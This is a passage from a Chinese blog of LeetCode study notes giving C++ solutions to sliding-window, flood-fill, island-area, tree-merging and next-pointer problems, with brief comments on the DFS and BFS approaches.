class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i!=<span class="number">0</span>)&#123;</span><br><span class="line">                occ.erase(s[i<span class="number">-1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span>(rk+<span class="number">1</span>&lt;n &amp;&amp; !occ.count(s[rk+<span class="number">1</span>]))&#123;</span><br><span class="line">                occ.insert(s[rk+<span class="number">1</span>]);</span><br><span class="line">                rk++;</span><br><span class="line">            &#125;</span><br><span class="line">            ans = <span class="built_in">max</span>(ans,rk-i+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="567-字符串的排列"><a href="#567-字符串的排列" class="headerlink" title="567. 字符串的排列"></a><a href="https://leetcode-cn.com/problems/permutation-in-string/" target="_blank" rel="noopener">567. 字符串的排列</a></h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">checkInclusion</span><span class="params">(<span class="built_in">string</span> s1, <span class="built_in">string</span> s2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s1.length(),m=s2.length();</span><br><span class="line">        <span class="keyword">if</span>(n &gt; m)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;int&gt; cnt1(26),cnt2(26);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            ++cnt1[s1[i]-<span class="string">'a'</span>];</span><br><span class="line">            ++cnt2[s2[i]-<span class="string">'a'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(cnt1 == cnt2)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=n;i&lt;m;i++)&#123;</span><br><span class="line">            ++cnt2[s2[i]-<span class="string">'a'</span>];<span class="comment">//滑动窗口，长度为子串长度n</span></span><br><span class="line">            --cnt2[s2[i - n]-<span class="string">'a'</span>];<span class="comment">//右边+1，左边-1</span></span><br><span class="line">            <span class="keyword">if</span>(cnt1==cnt2)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1 id="第-7-天-广度优先搜索-深度优先搜索"><a href="#第-7-天-广度优先搜索-深度优先搜索" class="headerlink" title="第 7 天 广度优先搜索 / 深度优先搜索"></a>第 7 天 广度优先搜索 / 深度优先搜索</h1><h3 id="733-图像渲染"><a href="#733-图像渲染" class="headerlink" title="733. 图像渲染"></a><a href="https://leetcode-cn.com/problems/flood-fill/" target="_blank" rel="noopener">733. 图像渲染</a></h3><blockquote>
<p>深度优先。</p>
<p>题目的意思类似于画图里面的油漆，hhh。</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> dx[<span class="number">4</span>]=&#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> dy[<span class="number">4</span>]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; <span class="built_in">image</span>,<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> color,<span class="keyword">int</span> newColor)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">image</span>[x][y] == color)&#123;</span><br><span class="line">            <span class="built_in">image</span>[x][y] = newColor;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">                <span class="keyword">int</span> mx = x+dx[i],my=y+dy[i];</span><br><span class="line">                <span class="keyword">if</span>(mx&gt;=<span class="number">0</span>&amp;&amp;mx&lt;<span class="built_in">image</span>.<span class="built_in">size</span>() &amp;&amp; my&gt;=<span class="number">0</span>&amp;&amp;my&lt;<span class="built_in">image</span>[<span class="number">0</span>].<span class="built_in">size</span>())&#123;</span><br><span class="line">                    dfs(<span class="built_in">image</span>,mx,my,color,newColor);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">floodFill</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; <span class="built_in">image</span>, <span class="keyword">int</span> sr, <span class="keyword">int</span> sc, <span class="keyword">int</span> newColor)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> currColor = <span class="built_in">image</span>[sr][sc];</span><br><span class="line">        <span class="keyword">if</span>(currColor != newColor)&#123;</span><br><span class="line">            dfs(<span class="built_in">image</span>,sr,sc,currColor,newColor);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">image</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>广度优先，加入队列实现</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> dx[<span class="number">4</span>]=&#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> dy[<span class="number">4</span>]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">floodFill</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; <span class="built_in">image</span>, <span class="keyword">int</span> sr, <span class="keyword">int</span> sc, <span class="keyword">int</span> newColor)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> currColor = <span class="built_in">image</span>[sr][sc];</span><br><span class="line">        <span class="keyword">if</span>(currColor == newColor) <span class="keyword">return</span> <span class="built_in">image</span>;</span><br><span class="line">        <span class="keyword">int</span> n = <span class="built_in">image</span>.<span class="built_in">size</span>(),m=<span class="built_in">image</span>[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        <span class="built_in">queue</span>&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt; que;</span><br><span class="line">        que.emplace(sr,sc);</span><br><span class="line">        <span class="built_in">image</span>[sr][sc]=newColor;</span><br><span class="line">        <span class="keyword">while</span>(!que.empty())&#123;</span><br><span class="line">            <span class="keyword">int</span> x = que.front().first,y=que.front().second;</span><br><span class="line">            que.pop();</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">                <span class="keyword">int</span> mx = x+dx[i],my=y+dy[i];</span><br><span class="line">                <span class="keyword">if</span>(mx&gt;=<span class="number">0</span>&amp;&amp;mx&lt;n &amp;&amp; my&gt;=<span class="number">0</span>&amp;&amp;my&lt;m&amp;&amp;<span class="built_in">image</span>[mx][my]==currColor)&#123;</span><br><span class="line">                    que.emplace(mx,my);</span><br><span class="line">                    <span class="built_in">image</span>[mx][my]=newColor;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">image</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="695-岛屿的最大面积"><a href="#695-岛屿的最大面积" class="headerlink" title="695. 岛屿的最大面积"></a><a href="https://leetcode-cn.com/problems/max-area-of-island/" target="_blank" rel="noopener">695. 岛屿的最大面积</a></h3><blockquote>
<p>深度优先，多了一个刚开始要循环所有（起点遍历）</p>
<p>是图的遍历</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> dx[<span class="number">4</span>]=&#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> dy[<span class="number">4</span>]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; grid,<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(x&lt;<span class="number">0</span> || y&lt;<span class="number">0</span> || x == grid.<span class="built_in">size</span>() || y==grid[<span class="number">0</span>].<span class="built_in">size</span>()||grid[x][y]!=<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        grid[x][y]=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> mx = x+dx[i],my = y+dy[i];</span><br><span class="line">            ans += dfs(grid,mx,my);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxAreaOfIsland</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; grid)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ans =<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;grid.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;grid[<span class="number">0</span>].<span class="built_in">size</span>();j++)&#123;</span><br><span class="line">                ans = <span class="built_in">max</span>(ans,dfs(grid,i,j));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>使用栈，非递归</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxAreaOfIsland</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; grid)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ans =<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;grid.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;grid[<span class="number">0</span>].<span class="built_in">size</span>();j++)&#123;</span><br><span class="line">                <span class="keyword">int</span> cur = <span class="number">0</span>;</span><br><span class="line">                <span class="built_in">stack</span>&lt;<span class="keyword">int</span>&gt; stacki;</span><br><span class="line">                <span class="built_in">stack</span>&lt;<span class="keyword">int</span>&gt; stackj;</span><br><span class="line">                stacki.push(i);</span><br><span class="line">                stackj.push(j);</span><br><span class="line">                <span class="keyword">while</span>(!stacki.empty())&#123;</span><br><span class="line">                    <span class="keyword">int</span> x = stacki.top(),y=stackj.top();</span><br><span class="line">                    stacki.pop();</span><br><span class="line">                    stackj.pop();</span><br><span class="line">                    <span class="keyword">if</span>(x&lt;<span class="number">0</span>||y&lt;<span class="number">0</span>||x==grid.<span class="built_in">size</span>()||y==grid[<span class="number">0</span>].<span class="built_in">size</span>()||grid[x][y]!=<span class="number">1</span>)&#123;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    ++cur;</span><br><span class="line">                    grid[x][y]=<span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">int</span> dx[<span class="number">4</span>]=&#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;;</span><br><span class="line">                    <span class="keyword">int</span> dy[<span class="number">4</span>]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>&#125;;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">                        <span class="keyword">int</span> mx = x+dx[i],my=y+dy[i];</span><br><span class="line">                        stacki.push(mx);</span><br><span class="line">                        stackj.push(my);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                ans=<span class="built_in">max</span>(ans,cur);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">         <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>广度优先</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> dx[<span class="number">4</span>]=&#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> dy[<span class="number">4</span>]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxAreaOfIsland</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; grid)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; grid.<span class="built_in">size</span>() ; i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; grid[<span class="number">0</span>].<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line">                <span class="keyword">int</span> cur = <span class="number">0</span>;</span><br><span class="line">                <span class="built_in">queue</span>&lt;pair&lt;<span class="keyword">int</span> ,<span class="keyword">int</span>&gt;&gt; que;</span><br><span class="line">                    que.emplace(i,j);</span><br><span class="line">                    <span class="keyword">while</span>(!que.empty())&#123;</span><br><span class="line">                        <span class="keyword">int</span> x = que.front().first,y = que.front().second;</span><br><span class="line">                        que.pop();</span><br><span class="line">                        <span class="keyword">if</span>(x &lt; <span class="number">0</span> || y &lt; <span class="number">0</span> || x == grid.<span class="built_in">size</span>() || y==grid[<span class="number">0</span>].<span class="built_in">size</span>() || grid[x][y] != <span class="number">1</span>)&#123;</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        ++cur;</span><br><span class="line">                        grid[x][y] = <span class="number">0</span>;</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span>; k++)&#123;</span><br><span class="line">                            <span class="keyword">int</span> mx = x + dx[k], my = y+dy[k];</span><br><span class="line">                                que.emplace(mx,my);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    ans = <span class="built_in">max</span>(ans,cur);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote>
<p>广度优先和深度优先，类似于模板题，多做些题，应该可以掌握。</p>
</blockquote>
<h1 id="第-8-天-广度优先搜索-深度优先搜索"><a href="#第-8-天-广度优先搜索-深度优先搜索" class="headerlink" title="第 8 天 广度优先搜索 / 深度优先搜索"></a>第 8 天 广度优先搜索 / 深度优先搜索</h1><h3 id="617-合并二叉树"><a href="#617-合并二叉树" class="headerlink" title="617. 合并二叉树"></a><a href="https://leetcode-cn.com/problems/merge-two-binary-trees/" target="_blank" rel="noopener">617. 合并二叉树</a></h3><blockquote>
<p>深度优先</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">mergeTrees</span><span class="params">(TreeNode* t1, TreeNode* t2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(t1==<span class="literal">nullptr</span>) <span class="keyword">return</span> t2;</span><br><span class="line">        <span class="keyword">if</span>(t2==<span class="literal">nullptr</span>) <span class="keyword">return</span> t1;</span><br><span class="line"></span><br><span class="line">        TreeNode* merged = <span class="keyword">new</span> TreeNode(t1-&gt;val + t2-&gt;val);</span><br><span class="line">        merged-&gt;left = mergeTrees(t1-&gt;left,t2-&gt;left);</span><br><span class="line">        merged-&gt;right = mergeTrees(t1-&gt;right,t2-&gt;right);</span><br><span class="line">        <span class="keyword">return</span> merged;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>广度优先</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">mergeTrees</span><span class="params">(TreeNode* t1, TreeNode* t2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(t1 == <span class="literal">nullptr</span>) <span class="keyword">return</span> t2;</span><br><span class="line">        <span class="keyword">if</span>(t2 == <span class="literal">nullptr</span>) <span class="keyword">return</span> t1;</span><br><span class="line">        TreeNode* merged = <span class="keyword">new</span> TreeNode(t1-&gt;val + t2-&gt;val);</span><br><span class="line">        <span class="built_in">queue</span>&lt;TreeNode*&gt; q,q1,q2;</span><br><span class="line">        q.push(merged);</span><br><span class="line">        q1.push(t1);</span><br><span class="line">        q2.push(t2);</span><br><span class="line">        <span class="keyword">while</span>(!q1.empty() &amp;&amp; !q2.empty())&#123;</span><br><span class="line">            TreeNode* node = q.front();<span class="comment">//三句话合在一起要用auto，不然报错</span></span><br><span class="line">            TreeNode* node1 = q1.front();</span><br><span class="line">            TreeNode* node2=q2.front();</span><br><span class="line">            q.pop();</span><br><span class="line">            q1.pop();</span><br><span class="line">            q2.pop();</span><br><span class="line">            TreeNode* left1 = node1-&gt;left;</span><br><span class="line">            TreeNode* left2 = node2-&gt;left;</span><br><span class="line">            TreeNode* right1 = node1-&gt;right;</span><br><span class="line">            TreeNode* right2 = node2-&gt;right;</span><br><span class="line">            <span class="keyword">if</span>(left1 != <span class="literal">nullptr</span> || left2!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(left1!=<span class="literal">nullptr</span> &amp;&amp; left2!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">                    <span class="keyword">auto</span> left = <span class="keyword">new</span> TreeNode(left1-&gt;val + left2-&gt;val);</span><br><span class="line">                    node-&gt;left = left;</span><br><span class="line">                    q.push(left);</span><br><span class="line">                    q1.push(left1);</span><br><span class="line">                    q2.push(left2);</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(left1 !=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">                    node-&gt;left = left1;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    node-&gt;left = left2;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(right1 != <span class="literal">nullptr</span> || right2!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(right1!=<span class="literal">nullptr</span> &amp;&amp; right2!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">                    <span class="keyword">auto</span> right = <span class="keyword">new</span> TreeNode(right1-&gt;val + right2-&gt;val);</span><br><span class="line">                    node-&gt;right = right;</span><br><span class="line">                    q.push(right);</span><br><span class="line">                    q1.push(right1);</span><br><span class="line">                    q2.push(right2);</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(right1 !=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">                    node-&gt;right = right1;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    node-&gt;right = right2;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> merged;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="116-填充每个节点的下一个右侧节点指针"><a href="#116-填充每个节点的下一个右侧节点指针" class="headerlink" title="116. 填充每个节点的下一个右侧节点指针"></a><a href="https://leetcode-cn.com/problems/populating-next-right-pointers-in-each-node/" target="_blank" rel="noopener">116. 填充每个节点的下一个右侧节点指针</a></h3><blockquote>
<p>层次遍历</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">// Definition for a Node.</span></span><br><span class="line"><span class="comment">class Node &#123;</span></span><br><span class="line"><span class="comment">public:</span></span><br><span class="line"><span class="comment">    int val;</span></span><br><span class="line"><span class="comment">    Node* left;</span></span><br><span class="line"><span class="comment">    Node* right;</span></span><br><span class="line"><span class="comment">    Node* next;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Node() : val(0), left(NULL), right(NULL), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Node(int _val) : val(_val), left(NULL), right(NULL), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Node(int _val, Node* _left, Node* _right, Node* _next)</span></span><br><span class="line"><span class="comment">        : val(_val), left(_left), right(_right), next(_next) &#123;&#125;</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">Node* <span class="title">connect</span><span class="params">(Node* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">nullptr</span>) <span class="keyword">return</span> root;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">queue</span>&lt;Node*&gt; Q;</span><br><span class="line">        Q.push(root);</span><br><span class="line">        <span class="keyword">while</span>(!Q.empty())&#123;</span><br><span class="line">            <span class="keyword">int</span> <span class="built_in">size</span> = Q.<span class="built_in">size</span>();</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">size</span>;i++)&#123;</span><br><span class="line">                Node* node = Q.front();</span><br><span class="line">                Q.pop();</span><br><span class="line">                <span class="keyword">if</span>(i&lt;<span class="built_in">size</span><span class="number">-1</span>)&#123;<span class="comment">//一层的左边size-1个</span></span><br><span class="line">                    node-&gt;next = Q.front();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(node-&gt;left!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">                    Q.push(node-&gt;left);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(node-&gt;right!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">                    Q.push(node-&gt;right);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>使用已建立的 next 指针，高级，根据具体题目分析可得</p>
</blockquote>
<p><img src="/2021/08/26/00-03/image-20210808100955721.png" alt="image-20210808100955721"></p>
<p><img src="/2021/08/26/00-03/image-20210808101008138.png" alt="image-20210808101008138"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">// Definition for a Node.</span></span><br><span class="line"><span class="comment">class Node &#123;</span></span><br><span class="line"><span class="comment">public:</span></span><br><span class="line"><span class="comment">    int val;</span></span><br><span class="line"><span class="comment">    Node* left;</span></span><br><span class="line"><span class="comment">    Node* right;</span></span><br><span class="line"><span class="comment">    Node* next;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Node() : val(0), left(NULL), right(NULL), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Node(int _val) : val(_val), left(NULL), right(NULL), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Node(int _val, Node* _left, Node* _right, Node* _next)</span></span><br><span class="line"><span class="comment">        : val(_val), left(_left), right(_right), next(_next) &#123;&#125;</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">Node* <span class="title">connect</span><span class="params">(Node* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">nullptr</span>) <span class="keyword">return</span> root;</span><br><span class="line"></span><br><span class="line">        Node* leftmost = root;</span><br><span class="line">        <span class="keyword">while</span>(leftmost -&gt; left !=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            Node* head = leftmost;</span><br><span class="line">            <span class="keyword">while</span>(head != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">                head-&gt;left-&gt;next = head-&gt;right;<span class="comment">//第一种</span></span><br><span class="line">                <span class="keyword">if</span>(head-&gt;next != <span class="literal">nullptr</span>)&#123;<span class="comment">//第二种</span></span><br><span class="line">                    